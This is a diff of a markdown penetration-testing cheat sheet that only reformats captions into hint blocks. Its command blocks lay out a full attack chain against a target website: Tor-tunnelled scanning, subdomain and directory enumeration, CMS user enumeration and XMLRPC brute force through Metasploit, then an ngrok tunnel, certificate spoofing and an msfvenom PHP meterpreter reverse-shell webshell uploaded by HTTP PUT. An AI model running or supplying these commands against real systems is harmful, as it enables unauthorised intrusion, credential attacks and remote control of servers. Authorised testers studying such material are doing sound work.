@@ -2,9 +2,9 @@
 
 ## Check List
 
-* [ ] _Ensure that defaults and known files have been removed._
-* [ ] _Validate that no debugging code or extensions are left in the production environments._
-* [ ] _Review the logging mechanisms set in place for the application._
+* [ ] Ensure that defaults and known files have been removed.
+* [ ] Validate that no debugging code or extensions are left in the production environments.
+* [ ] Review the logging mechanisms set in place for the application.
 
 ## Cheat Sheet
 
@@ -12,7 +12,9 @@
 
 #### [Multitor](https://github.com/trimstray/multitor)
 
-_20 Tor Tunnel_
+{% hint style="info" %}
+20 Tor Tunnel
+{% endhint %}
 
 ```bash
 multitor --init 20 \
@@ -24,7 +26,9 @@ multitor --init 20 \
 
 #### [Nikto](https://github.com/sullo/nikto)
 
-_Scan Web Server_
+{% hint style="info" %}
+Scan Web Server
+{% endhint %}
 
 ```bash
 nikto -h $WEBSITE
@@ -32,7 +36,9 @@ nikto -h $WEBSITE
 
 #### [SubFinder](https://github.com/projectdiscovery/subfinder)
 
-_Subdomain Fuzzing_
+{% hint style="info" %}
+Subdomain Fuzzing
+{% endhint %}
 
 ```bash
 subfinder -d $WEBSITE -o /tmp/subdomains.txt
@@ -40,7 +46,9 @@ subfinder -d $WEBSITE -o /tmp/subdomains.txt
 
 #### [ShuffleDNS](https://github.com/projectdiscovery/shuffledns)
 
-_Resolve Subdomains_
+{% hint style="info" %}
+Resolve Subdomains
+{% endhint %}
 
 ```bash
 echo "1.1.1.1" > /tmp/resolvers.txt
@@ -53,7 +61,9 @@ shuffledns -d $WEBSITE \
 
 #### [Httpx](https://github.com/projectdiscovery/httpx)
 
-_Check Http Live_
+{% hint style="info" %}
+Check Http Live
+{% endhint %}
 
 ```bash
 cat /tmp/sub-domains.txt | \
@@ -64,7 +74,9 @@ httpx -silent -sc -probe -title -td -ip \
 
 #### [Httpx-Toolkit](https://github.com/projectdiscovery/httpx)
 
-_Find Alive Ports_
+{% hint style="info" %}
+Find Alive Ports
+{% endhint %}
 
 ```bash
 httpx-toolkit -l /tmp/alive-subdomains.txt \
@@ -74,7 +86,9 @@ httpx-toolkit -l /tmp/alive-subdomains.txt \
 
 #### [Katana](https://github.com/projectdiscovery/katana)
 
-_Find Source URLs_
+{% hint style="info" %}
+Find Source URLs
+{% endhint %}
 
 ```bash
 katana -u /tmp/alive-subdomains.txt \
@@ -87,7 +101,9 @@ katana -u /tmp/alive-subdomains.txt \
 
 #### [Grep](https://www.gnu.org/s/grep/manual/grep.html)
 
-_Find Sensitive Infos_
+{% hint style="info" %}
+Find Sensitive Infos
+{% endhint %}
 
 ```bash
 cat /tmp/all-urls.txt | \
@@ -96,7 +112,9 @@ grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\
 
 #### [Dirsearch](https://github.com/maurosoria/dirsearch)
 
-_Directory Fuzzing_
+{% hint style="info" %}
+Directory Fuzzing
+{% endhint %}
 
 ```bash
 dirsearch -l /tmp/sub-domains.txt \
@@ -106,37 +124,49 @@ dirsearch -l /tmp/sub-domains.txt \
 
 #### [Nuclei](https://github.com/projectdiscovery/nuclei)
 
-_List all Tags_
+{% hint style="info" %}
+List all Tags
+{% endhint %}
 
 ```bash
 nuclei -tgl
 ```
 
-_Scan OSINT & Recon_
+{% hint style="info" %}
+Scan OSINT & Recon
+{% endhint %}
 
 ```bash
 nuclei -u $WEBSITE -tags osint enum recon
 ```
 
-_Scan CVEs & Vulnerabilities_
+{% hint style="info" %}
+Scan CVEs & Vulnerabilities
+{% endhint %}
 
 ```bash
 nuclei -u $WEBSITE -tags cves detect vulnerabilities
 ```
 
-_Scan CVEs with Multitor_
+{% hint style="info" %}
+Scan CVEs with Multitor
+{% endhint %}
 
 ```bash
 nuclei -u $WEBSITE -tags cves detect vulnerabilities -proxy socks4://127.0.0.1:16379
 ```
 
-_Scan Misconf & Panel_
+{% hint style="info" %}
+Scan Misconf & Panel
+{% endhint %}
 
 ```bash
 nuclei -u $WEBSITE -tags exposure misconfig disclosure tech panel
 ```
 
-_XSS & SQLi & LFI & RCE & SSRF_
+{% hint style="info" %}
+XSS & SQLi & LFI & RCE & SSRF
+{% endhint %}
 
 ```bash
 nuclei -u $WEBSITE -tags xss lfi sqli ssrf traversal fileupload rce unauth deserialization
@@ -144,37 +174,49 @@ nuclei -u $WEBSITE -tags xss lfi sqli ssrf traversal fileupload rce unauth deser
 
 #### [WPScan](https://github.com/wpscanteam/wpscan)
 
-_Scan General_
+{% hint style="info" %}
+Scan General
+{% endhint %}
 
 ```bash
 wpscan --url $WEBSITE --rua --api-token $TOKEN
 ```
 
-Scan with _Multitor_
+{% hint style="info" %}
+Scan with Multitor
+{% endhint %}
 
 ```bash
 wpscan --url $WEBSITE --rua --api-token $TOKEN --proxy socks4://127.0.0.1:16379
 ```
 
-_Enum Users_
+{% hint style="info" %}
+Enum Users
+{% endhint %}
 
 ```bash
 wpscan --url $WEBSITE --rua --api-token $TOKEN -e u, m
 ```
 
-_Enum Plugins_
+{% hint style="info" %}
+Enum Plugins
+{% endhint %}
 
 ```bash
 wpscan --url $WEBSITE --rua --api-token $TOKEN -e ap, vp, p
 ```
 
-_Enum Themes_
+{% hint style="info" %}
+Enum Themes
+{% endhint %}
 
 ```bash
 wpscan --url $WEBSITE --rua --api-token $TOKEN -e at, vt, t
 ```
 
-_Enum Config Backups_
+{% hint style="info" %}
+Enum Config Backups
+{% endhint %}
 
 ```bash
 wpscan --url $WEBSITE --rua --api-token $TOKEN -e cb, dbe, tt
@@ -182,19 +224,25 @@ wpscan --url $WEBSITE --rua --api-token $TOKEN -e cb, dbe, tt
 
 #### [Joomscan](https://github.com/OWASP/joomscan)
 
-_Scan General_
+{% hint style="info" %}
+Scan General
+{% endhint %}
 
 ```bash
 joomscan -u $WEBSITE --random-agent
 ```
 
-_Scan with Multitor_
+{% hint style="info" %}
+Scan with Multitor
+{% endhint %}
 
 ```bash
 joomscan -u $WEBSITE --random-agent --proxy socks4://127.0.0.1:16379
 ```
 
-_Enum Endpoints_
+{% hint style="info" %}
+Enum Endpoints
+{% endhint %}
 
 ```bash
 joomscan -u $WEBSITE --random-agent -ec
@@ -202,13 +250,17 @@ joomscan -u $WEBSITE --random-agent -ec
 
 #### [Droopescan](https://github.com/SamJoan/droopescan)
 
-_Scan General_
+{% hint style="info" %}
+Scan General
+{% endhint %}
 
 ```bash
 droopescan scan drupal -u $WEBSITE
 ```
 
-_Enum Endpoints_
+{% hint style="info" %}
+Enum Endpoints
+{% endhint %}
 
 ```bash
 droopescan scan drupal -u $WEBSITE --enumerate a
@@ -216,19 +268,25 @@ droopescan scan drupal -u $WEBSITE --enumerate a
 
 #### [Drupwn](https://github.com/immunIT/drupwn)
 
-_Scan General_
+{% hint style="info" %}
+Scan General
+{% endhint %}
 
 ```bash
 drupwn --mode exploit --target $WEBSITE
 ```
 
-_Enum Endpoints_
+{% hint style="info" %}
+Enum Endpoints
+{% endhint %}
 
 ```bash
 drupwn --mode enum --modules --target $WEBSITE
 ```
 
-_Enum Users_
+{% hint style="info" %}
+Enum Users
+{% endhint %}
 
 ```bash
 drupwn --mode enum --users --target $WEBSITE
@@ -236,7 +294,9 @@ drupwn --mode enum --users --target $WEBSITE
 
 #### [SPartan](https://github.com/sensepost/SPartan)
 
-_Scan SharePoint_
+{% hint style="info" %}
+Scan SharePoint
+{% endhint %}
 
 ```bash
 spartan -u $WEBSITE --sps --users -s
@@ -244,7 +304,9 @@ spartan -u $WEBSITE --sps --users -s
 
 #### [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
 
-_Scan & Enum IIS_
+{% hint style="info" %}
+Scan & Enum IIS
+{% endhint %}
 
 ```bash
 iis_shortname_scanner 2 20 $WEBSITE
@@ -254,19 +316,25 @@ iis_shortname_scanner 2 20 $WEBSITE
 
 #### [Katana](https://github.com/projectdiscovery/katana)
 
-_HTML Sources_
+{% hint style="info" %}
+HTML Sources
+{% endhint %}
 
 ```bash
 katana -u $WEBSITE 
 ```
 
-_JS Sources_
+{% hint style="info" %}
+JS Sources
+{% endhint %}
 
 ```bash
 katana -u $WEBSITE | grep "\.js$"
 ```
 
-_CSS Sources_
+{% hint style="info" %}
+CSS Sources
+{% endhint %}
 
 ```bash
 katana -u $WEBSITE | grep "\.css*"
@@ -290,7 +358,9 @@ hardentools-cli.exe
 
 #### [Nmap](https://nmap.org/)
 
-_HTTP Methods_
+{% hint style="info" %}
+HTTP Methods
+{% endhint %}
 
 ```bash
 nmap -sS -sV --mtu 5000 --script http-methods $WEBSITE
@@ -298,7 +368,9 @@ nmap -sS -sV --mtu 5000 --script http-methods $WEBSITE
 
 #### [Metasploit](https://www.metasploit.com/)
 
-_PingBack XMLRPC_
+{% hint style="info" %}
+PingBack XMLRPC
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -310,7 +382,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Brute force XMLRPC with Multitor_
+{% hint style="info" %}
+Brute force XMLRPC with Multitor
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -327,7 +401,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Scan PUT Methods_
+{% hint style="info" %}
+Scan PUT Methods
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -339,13 +415,17 @@ msfconsole -qx "
     run -j"
 ```
 
-_Start Ngrok_
+{% hint style="info" %}
+Start Ngrok
+{% endhint %}
 
 ```bash
 ngrok tcp 4444 >/dev/null 2>&1 &
 ```
 
-_Define ENV Ngrok_
+{% hint style="info" %}
+Define ENV Ngrok
+{% endhint %}
 
 ```bash
 NGINFO=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels); \
@@ -353,7 +433,9 @@ NGHOST=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/([^"]*):.*/\1/p'); \
 NGPORT=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/.*.tcp.*.ngrok.io:([^"]*).*/\1/p')
 ```
 
-_Cert Spoof_
+{% hint style="info" %}
+Cert Spoof
+{% endhint %}
 
 ```bash
 rm -rf /home/$USER/.msf4/loot/*
@@ -364,13 +446,17 @@ msfconsole -qx "
     exit"
 ```
 
-_Define ENV Cert_
+{% hint style="info" %}
+Define ENV Cert
+{% endhint %}
 
 ```bash
 CERT=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.pem" -printf "%f\n" | head -n 1)
 ```
 
-_Post-EXP_
+{% hint style="info" %}
+Post-EXP
+{% endhint %}
 
 ```bash
 cat > /tmp/post-exp.rc << EOF
@@ -389,7 +475,9 @@ bg
 EOF
 ```
 
-_Generate Webshell_
+{% hint style="info" %}
+Generate Webshell
+{% endhint %}
 
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp \
@@ -408,7 +496,9 @@ sed -i "s#eval#<?php eval#g" /tmp/unk9vvn.php; \
 sed -i "s#));#)); ?>#g" /tmp/unk9vvn.php
 ```
 
-_Listening Metasploit_
+{% hint style="info" %}
+Listening Metasploit
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -425,7 +515,9 @@ msfconsole -qx "
     run -j"
 ```
 
-_Upload Shell PUT Method_
+{% hint style="info" %}
+Upload Shell PUT Method
+{% endhint %}
 
 ```bash
 curl -v $WEBSITE/wp-content/uploads --upload-file /tmp/unk9vvn.php
@@ -433,9 +525,11 @@ curl -v $WEBSITE/wp-content/uploads --upload-file /tmp/unk9vvn.php
 
 ### **Logging**
 
-#### Commix
+#### [Commix](https://github.com/commixproject/commix)
 
-_Code Injection_
+{% hint style="info" %}
+Code Injection
+{% endhint %}
 
 ```bash
 commix -u $WEBSITE
